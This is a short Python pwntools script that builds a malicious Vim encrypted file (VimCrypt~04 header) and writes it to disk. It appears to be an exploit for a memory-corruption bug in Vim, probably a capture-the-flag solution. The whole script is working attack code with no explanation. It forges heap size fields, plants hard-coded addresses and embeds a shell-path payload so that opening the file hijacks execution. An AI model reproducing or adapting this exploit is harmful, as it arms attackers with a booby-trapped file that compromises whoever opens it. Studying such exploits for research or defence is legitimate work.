from pwn import *
fp = open('exp','wb')
pay= '/bin/bin/sh\x00'
pay = pay+'A'*(0x24-len(pay))
pay+= p64(0x4C9163)
pay = pay+'\x00'*(0x30-len(pay))
content = 'VimCrypt~04!'
content+= '\xff\xff\xff\x9e' #iv 4 bytes
content+= 'A'*5 +p64(0x101)[::-1]+p64(0)[::-1]+p64(0x8A8238-0x61)[::-1]+'\x00'
#content+= 'A'*0x72
#content+= pay
for i in range(0x115-len(content)):
    content+=chr(i%0x100)
content = content.replace(p64(0xd4d5d6d7d8d9dadb)[::-1],p64(0x121)[::-1])

content = content.replace('\xcf\xd0\xd1\xd2\xd3',pay[:5][::-1])
con = '\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98'
content = content.replace(con,pay[5:][::-1])
content = content.replace('\xb1\xb2\xb3\xb4\xb5','\x00\x00\x8a\x82\x18')
content = content.replace('\xe4\xe5\xe6','\x00\x00\x00')
print content.encode('hex')
fp.write(content)
fp.close()